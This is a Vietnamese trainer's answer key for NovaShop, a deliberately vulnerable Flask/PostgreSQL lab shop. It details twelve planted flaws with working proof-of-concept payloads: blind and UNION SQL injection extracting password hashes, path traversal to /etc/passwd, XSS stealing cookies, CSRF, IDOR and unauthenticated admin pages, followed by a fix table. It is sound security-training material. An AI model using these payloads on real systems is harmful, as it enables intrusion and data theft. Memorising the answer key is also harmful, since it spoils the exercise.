# NovaShop — Lab ứng dụng web có lỗ hổng (dành cho trainer)

**Đây là answer key. Không đưa file này cho học viên.**

NovaShop là một web shop bán hàng giả lập (Python/Flask + PostgreSQL), giao diện và
bảng thông báo lỗi hoàn toàn tự nhiên — **không có bất kỳ dấu hiệu nào cho biết chức
năng nào đang có lỗi** (không comment gợi ý trong HTML, lỗi SQL/imput sai đều trả về
trạng thái bình thường, trang lỗi chung chung). Ứng dụng chứa **đúng 12 lỗ hổng**
trong danh sách bên dưới và không có lỗ hổng ngoài danh sách.

## Chạy ứng dụng

```bash
cd novashop
docker compose up -d --build
```

- App: http://localhost:5050
- Đổi port: sửa `ports` trong `compose.yaml`
- Xem DB trực tiếp: `docker compose exec db psql -U shopapp -d shopapp`
- Reset về trạng thái ban đầu (xoá toàn bộ dữ liệu test): `docker compose down -v && docker compose up -d`

### Chạy không dùng Docker

Cần PostgreSQL đang chạy ở localhost:

```bash
createdb shopapp
psql -c "CREATE USER shopapp WITH PASSWORD 'shopapp';" # nếu chưa có
psql -d shopapp -c "GRANT ALL ON DATABASE shopapp TO shopapp;"
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python app.py   # mặc định postgresql://shopapp:shopapp@localhost:5432/shopapp, port 5000
```

Schema + dữ liệu mẫu tự khởi tạo ở lần chạy đầu.

## Tài khoản mẫu

| Username | Password       | Người |
|----------|----------------|-------|
| alice    | password123    | người dùng thường |
| bob      | password123    | người dùng thường (nạn nhân IDOR) |
| carol    | password123    | người dùng thường |
| admin    | Adm1n2026!     | quản trị (chỉ là dữ liệu mẫu) |

Dữ liệu mẫu có sẵn: 12 sản phẩm, review, 4 inquiry (có SĐT/địa chỉ), 3 draft (draft
#2 của bob chứa SĐT riêng tư), favorite của alice/bob/carol.

## Danh sách lỗ hổng & PoC

Tất cả PoC đã được kiểm chứng hoạt động end-to-end. Base URL: `http://localhost:5050`

---

### 1. SQL Injection (Shop) — **boolean-based / blind**

Vị trí: ô **Search** ở trang `/shop`, tham số `q`. Câu truy vấn nối chuỗi:

```sql
SELECT ... FROM products WHERE id IN (SELECT id FROM products WHERE name ILIKE '%{q}%')
```

Vì điểm chèn nằm **bên trong subquery `IN (...)`** nên UNION không thể hiển thị dữ
liệu (kết quả subquery chỉ được dùng làm tập id), và mọi lỗi SQL bị bắt im lặng →
cách khai thác khả thi duy nhất là **boolean oracle**: điều kiện TRUE → hiện toàn
bộ 12 sản phẩm, FALSE → 0 sản phẩm.

| Mục đích | Payload `q` | Kết quả |
|---|---|---|
| TRUE | `' OR 1=1 OR ''='` | 12 products |
| FALSE | `' AND 1=2 OR ''='` | 0 products |
| Trích từng ký tự | `' AND SUBSTR((SELECT password_hash FROM users WHERE username='admin'),1,6)='scrypt' OR ''='` | 12 products (TRUE) |
| Đổi `'scrypt'` thành `'pbkdf2'` | như trên | 0 products (FALSE) |

Ghi chú: payload kết thúc bằng `OR ''='` để "hấp thụ" phần `%'` còn lại của chuỗi
(không dùng được `--` vì sau điểm chèn còn dấu `)` đóng subquery). Blind script nên
duyệt qua từng vị trí `SUBSTR(...,i,1)` hoặc dùng `ASCII()` để so sánh nhị phân.
Data có thể trích: bảng `users` (username, password_hash, email...).

---

### 2. Open Redirect

Vị trí: tham số `next` của trang đăng nhập `/login`.

```
GET /login?next=https://evil.example   → đăng nhập → 302 Location: https://evil.example/
GET /login?next=//evil.example         → 302 //evil.example
```

---

### 3. Path Traversal — đọc file tuỳ ý

Vị trí: trang `/downloads`, endpoint `/files/download?name=...`. Đường dẫn được
ghép bằng `os.path.join(files_dir, name)` mà không kiểm tra thoát khỏi thư mục gốc.

```
/files/download?name=../../../../etc/passwd
/files/download?name=/etc/passwd          (đường dẫn tuyệt đối đè luôn base)
```

Trong container Linux đọc được `/etc/passwd`, `/proc/self/environ` (có SECRET_KEY)...

---

### 4. IDOR — ghi/cập nhật profile người khác

Vị trí: `POST /profile/update`. Form "Edit profile" chứa trường ẩn `user_id`, server
dùng giá trị đó để UPDATE mà không kiểm tra chủ sở hữu.

Đăng nhập bằng **alice**, gửi:

```bash
curl -b alice.jar -X POST http://localhost:5050/profile/update \
  --data-urlencode "user_id=2" \
  --data-urlencode "full_name=Bob HACKED" \
  --data-urlencode "email=bob.tran@mail.com" \
  --data-urlencode "bio=owned"
```

→ profile của **bob** (id=2) bị thay đổi. Kiểm chứng qua `/admin/users` hoặc đăng
nhập lại bằng bob.

---

### 5. DOM XSS — trang hiển thị profile

Vị trí: `/profile`. JS cuối trang đọc `location.hash`, nếu hash có dạng
`#updated=<giá trị>` thì decodeURIComponent rồi gán vào `innerHTML`. Hash **không
bao giờ gửi lên server** → đây là DOM XSS thuần (server không thấy payload).

```
http://localhost:5050/profile#updated=<img src=x onerror=alert(document.domain)>
```

(đăng nhập trước khi mở URL; `<script>` chèn qua innerHTML không chạy — dùng thẻ
img/svg onload/onerror). Bề mặt khai thác hợp lệ: hash này cũng xuất hiện sau khi
lưu profile thật (`#updated=<tên mới>`).

---

### 6. Stored XSS — hiển thị review

Vị trí: review sản phẩm `/product/<id>`. Nội dung review được render không escape.

1. Đăng nhập, vào bất kỳ sản phẩm, ví dụ `/product/1`
2. Gửi review với nội dung: `<img src=x onerror=alert(document.cookie)> Great!`
3. Mọi người mở `/product/1` → script chạy (payload lưu trong DB, tự kích hoạt với
   mọi người truy cập).

---

### 7. CSRF — chức năng yêu thích (favorites)

Vị trí: thêm/xoá yêu thích là request **GET** `/favorites/toggle/<product_id>`,
không có CSRF token, chỉ dựa vào session cookie.

Trang của kẻ tấn công (khác origin), nạn nhân đã đăng nhập NovaShop trên cùng trình duyệt:

```html
<!doctype html>
<html><body>
  <!-- top-level GET navigation vẫn mang cookie SameSite=Lax -->
  <form id="f" action="http://localhost:5050/favorites/toggle/11">
    <input type="submit" value="Xem kết quả">
  </form>
  <script>document.getElementById('f').submit();</script>
</body></html>
```

Mở trang này → sản phẩm #11 bị thêm vào danh sách yêu thích của nạn nhân mà không
cần đồng ý (hoặc bị xoá nếu đã có sẵn — toggle).

---

### 8. XSS — chức năng yêu thích (favorites)

Vị trí: tham số `added` trên trang `/favorites` (tham số mà server trả về sau khi
thêm yêu thích), được render không escape:

```
http://localhost:5050/favorites?added=<script>alert(1)</script>
```

(đăng nhập trước). Tag `<script>` nằm trong HTML response ban đầu nên thực thi ngay.

---

### 9. SQL Injection — form liên hệ (inquiry) — UNION-based

Vị trí: `POST /contact`, trường **email**. Câu "lịch sử yêu cầu theo email" sau khi
gửi được nối chuỗi:

```sql
SELECT id, subject, created_at FROM inquiries WHERE email = '{email}' ORDER BY id DESC LIMIT 5
```

Gửi form Contact với:

- name: `test`
- **email:** `' UNION SELECT id, username || ' :: ' || password_hash, NULL FROM users--`
- message: bất kỳ

Trang xác nhận hiển thị "Recent requests from this email" chứa username + password
hash của toàn bộ user. (Khác SQLi #1 — chỗ này UNION hiển thị được vì kết quả trả
thẳng ra view.)

---

### 10. IDOR — danh sách liên hệ, xem inquiry của người khác

Vị trí: `/support/ticket/<id>`. Server chỉ kiểm tra "đã đăng nhập", không kiểm tra
chủ sở hữu ticket.

Đăng nhập bằng bất kỳ tài khoản, duyệt id:

```
/support/ticket/1   → inquiry của alice (email, nội dung)
/support/ticket/3   → SĐT của carol
/support/ticket/4   → SĐT + địa chỉ của David
```

---

### 11. IDOR — sửa bản nháp (draft) của người khác

Vị trí: `GET|POST /drafts/<id>/edit`. Không kiểm tra `drafts.user_id` khớp session.

Đăng nhập bằng **alice**:

```
GET  /drafts/2/edit     → thấy được draft "Complaint draft - late delivery" của bob (có SĐT riêng)
POST /drafts/2/edit     (form title/content) → sửa được draft của bob
```

---

### 12. Missing authentication

Vị trí: khu vực quản trị **không có bất kỳ kiểm tra đăng nhập/phân quyền nào**.
Khu vực Admin nằm ở **menu trên (topbar)** — hiện khi đã đăng nhập, gồm 3 trang:
`/admin` (Overview) ⇄ `/admin/users` ⇄ `/admin/inquiries`.

```
/admin              → trang tổng quan (số users, số inquiries)
/admin/users        → danh sách toàn bộ người dùng (username, họ tên, email)
/admin/inquiries    → danh sách toàn bộ liên hệ (tên, email, chủ đề)
```

Truy cập ẩn danh (không cookie) vẫn nhận đầy đủ dữ liệu, HTTP 200 — UI không
hiện link Admin cho khách chưa đăng nhập, nhưng vào thẳng URL là mở khóa.

---

## Kiểm tra "không có lỗ hổng thừa"

- **Không có endpoint ẩn/chết**: đã crawl tự động toàn bộ UI (trạng thái đăng nhập
  và ẩn danh) — mọi link + form trên mọi trang đều gọi được, trả 200/302 đúng.
- Toàn bộ truy vấn còn lại dùng parameterized query; note của favorite được escape;
  username bị chặn regex ở đăng ký; login sai trả thông báo chung chung.
- Lỗi SQL ở #1 và #9 được bắt và trả về trạng thái rỗng/bình thường — không error
  message, không 500, không phân biệt được với "không có kết quả".
- Trang 404/500 là trang chung chung, không stack trace.
- Mật khẩu lưu bằng hash (werkzeug), session cookie HttpOnly.

## Hướng dẫn khắc phục (tóm tắt để debrief)

| # | Lỗ hổng | Fix |
|---|---------|-----|
| 1 | SQLi Shop | Dùng `%s` parameterized cho `q` |
| 2 | Open Redirect | Whitelist `next`: chỉ chấp nhận path nội bộ bắt đầu bằng `/` và không phải `//` |
| 3 | Path Traversal | `os.path.realpath` + kiểm tra prefix nằm trong thư mục gốc; whitelist tên file |
| 4 | IDOR profile | Bỏ `user_id` khỏi form, luôn lấy id từ session |
| 5 | DOM XSS | Dùng `textContent` thay `innerHTML`; không render dữ liệu từ URL |
| 6 | Stored XSS | Bỏ `\|safe`, escape đầu ra (Jinja autoescape mặc định); sanitise đầu vào |
| 7 | CSRF | Đổi state-change sang POST + CSRF token; SameSite |
| 8 | XSS favorites | Bỏ `\|safe` với `added`; escape |
| 9 | SQLi contact | Parameterized cho email trong truy vấn lịch sử |
| 10 | IDOR ticket | Kiểm tra ticket thuộc về người dùng hiện tại (hoặc chỉ admin) |
| 11 | IDOR draft | `WHERE id = %s AND user_id = <session>` |
| 12 | Missing auth | Thêm middleware kiểm tra đăng nhập + vai trò admin cho `/admin/*` |
